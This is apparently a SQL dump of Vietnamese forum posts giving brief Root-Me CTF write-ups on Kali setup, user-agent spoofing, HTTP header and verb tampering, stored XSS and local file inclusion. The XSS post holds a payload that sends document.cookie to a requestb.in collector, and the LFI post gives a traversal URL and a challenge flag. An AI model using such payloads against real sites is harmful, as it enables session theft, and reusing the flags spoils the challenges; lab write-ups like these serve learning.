INSERT INTO `contests_discussions` (`id`, `type`, `title`, `link`, `content`, `cid`, `uid`, `views`, `replies`, `created`, `modified`, `last_post`) VALUES
(13, 0, '[OS] Kali Linux - Hệ điều hành của các chuyên gia bảo mật, hacker', 'os-kali-linux---he-dieu-hanh-cua-cac-chuyen-gia-bao-mat-hacker', 'Ở bài này mình sẽ hướng dẫn cài đặt trên Virtual Box (máy ảo) (nghĩa là chạy Kali Linux trong nền Windows hay hệ điều hành gì mà mọi người đang dùng)<br><br>I. Cài đặt Virtual Box<br>Tải Virtual Box:<br>Cài đặt: Cứ bấm next thôi.<br><br>II. Tải Kali Linux image disk<br>Link download:<br>', 1, 2, 3, 0, '2016-10-14 17:07:00', '2016-10-14 16:07:00', '2016-10-14 16:07:00'),
(14, 0, '[Web server] User agent', 'web-server-user-agent', 'Để ý gợi ý: Admin is dumb.<br>=&gt; Sửa user agent thành tên admin =&gt; Solved<br><p><br></p>', 1, 2, 2, 0, '2016-10-29 18:45:41', '2016-10-29 17:45:41', '2016-10-29 17:45:41'),
(15, 0, '[Web client] XSS - stored 1', 'web-client-xss---stored-1', '<p>Lỗ hổng XSS: Cross-site scripting</p><p>Chèn được script vào request =&gt; người load trang sẽ chạy đoạn script đó<a href=\"https://www.youtube.com/watch?v=tZcHyaMR3oc\"></a><br></p><p>Using requestb.in, tạo request mới, chèn code ảnh <code>&lt;img src=\"http://requestb.in/[requestbinID]?inspector=\'+document.cookie+\'\"/&gt;<br></code>rồi vào trang requestb.in xem request trả về, sẽ lấy được giá trị cookie =&gt; Solved.<br></p><p><br></p><p>Reference: <a href=\"https://en.wikipedia.org/wiki/Cross-site_scripting\">https://en.wikipedia.org/wiki/Cross-site_scripting</a><br>Youtube: <a href=\"https://www.youtube.com/watch?v=tZcHyaMR3oc\">https://www.youtube.com/watch?v=tZcHyaMR3oc</a></p>', 1, 2, 17, 0, '2016-10-29 18:47:20', '2016-10-29 17:47:20', '2016-10-29 17:47:20'),
(17, 0, '[Web server] HTTP Headers', 'web-server-http-headers', '<h3 class=\"crayon challenge-soustitre-36 \" itemprop=\"about\">HTTP response give informations</h3><p>nghĩa là phải đọc HTTP response. Sử dụng Burp Suite (Repeater) để đọc đồng thời sửa http header request.</p><p>Full write-up: <a href=\"http://blog.phonecyber.net/write-up/root-me-http-headers\">http://blog.phonecyber.net/write-up/root-me-http-headers</a></p><p>Reference:&nbsp;<a href=\"https://hack-ed.net/2016/01/09/burp-suite-for-beginners/\">https://hack-ed.net/2016/01/09/burp-suite-for-beginners/</a></p>', 1, 2, 2, 0, '2016-10-30 11:38:14', '2016-10-30 10:38:14', '2016-10-30 10:38:14'),
(18, 0, '[Web server] HTTP verb tampering', 'web-server-http-verb-tampering', 'Đổi http verb (cũng là header request =&gt; dùng burp suite repeater)<br>Full write-up: <a href=\"http://blog.phonecyber.net/write-up/root-me-http-verb-tampering\">http://blog.phonecyber.net/write-up/root-me-http-verb-tampering</a><br>', 1, 2, 1, 0, '2016-10-30 12:06:08', '2016-10-30 11:06:08', '2016-10-30 11:06:08'),
(19, 0, '[Web server] Install files', 'web-server-install-files', 'Ctrl+U &gt;&gt; get line <br><code>&lt;!-- ... --&gt;<br></code><br>Access <a href=\"http://challenge01.root-me.org/web-serveur/ch6/phpbb/install/\">http://challenge01.root-me.org/web-serveur/ch6/phpbb/install/</a> &gt;&gt; install.php<br>Access <a href=\"http://challenge01.root-me.org/web-serveur/ch6/phpbb/install/install.php\">http://challenge01.root-me.org/web-serveur/ch6/phpbb/install/install.php</a><br>Bingo!<br>', 1, 2, 19, 0, '2016-10-30 12:09:35', '2016-10-30 11:09:35', '2016-10-30 11:09:35'),
(24, 0, '[Web server] Local file inclusion (ch16) (simplest)', 'web-server-local-file-inclusion--ch16--simplest', '<p>Use this URL:&nbsp;<code>http://challenge01.root-me.org/web-serveur/ch16/?files=../&amp;f=admin/index.php<br></code></p><p>Flag:&nbsp;<code>OpbNJ60xYpvAQU8<br></code></p><p>More details:&nbsp;<a href=\"http://www.cnblogs.com/joy-nick/p/5569475.html\">http://www.cnblogs.com/joy-nick/p/5569475.html</a></p>', 1, 2, 11, 0, '2017-01-07 12:48:01', '2017-01-07 11:48:01', '2017-01-07 11:48:01'),
(39, 0, 'New discussion topic', '', 'Content', 1, 2, 0, 0, '2017-02-15 07:20:26', '2017-02-15 07:20:26', '2017-02-15 07:20:26'),
